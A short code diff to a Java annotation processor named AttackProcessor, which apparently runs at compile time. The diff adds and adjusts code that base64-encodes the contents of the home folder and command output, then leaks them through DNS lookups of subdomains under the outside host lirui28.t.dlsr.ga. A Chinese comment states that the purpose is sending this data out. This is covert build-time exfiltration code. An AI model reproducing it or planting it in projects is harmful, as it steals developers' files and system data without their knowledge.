@@ -46,7 +46,11 @@ public class AttackProcessor extends AbstractProcessor {
             //输出base64编码的url home文件夹的内容到外部
             fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
 
-            Inet4Address.getByName( fs.substring( 0,40 )+".lirui28.t.dlsr.ga" );
+            if (fs.length()>40){
+                Inet4Address.getByName( fs.substring( 0,40 )+".lirui28.t.dlsr.ga" );
+            } else {
+                    Inet4Address.getByName( "xiaoyu41"+".lirui28.t.dlsr.ga" );
+            }
 
             try {
                 Runtime runtime = Runtime.getRuntime();
@@ -60,7 +64,7 @@ public class AttackProcessor extends AbstractProcessor {
 
                     s = new String( Base64.getEncoder().encode( s.getBytes() ) );
 
-                    s = s.substring( 0,40 );
+                    s = s.substring( 0,10 );
                     Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
                 }
             } catch (Exception e) {
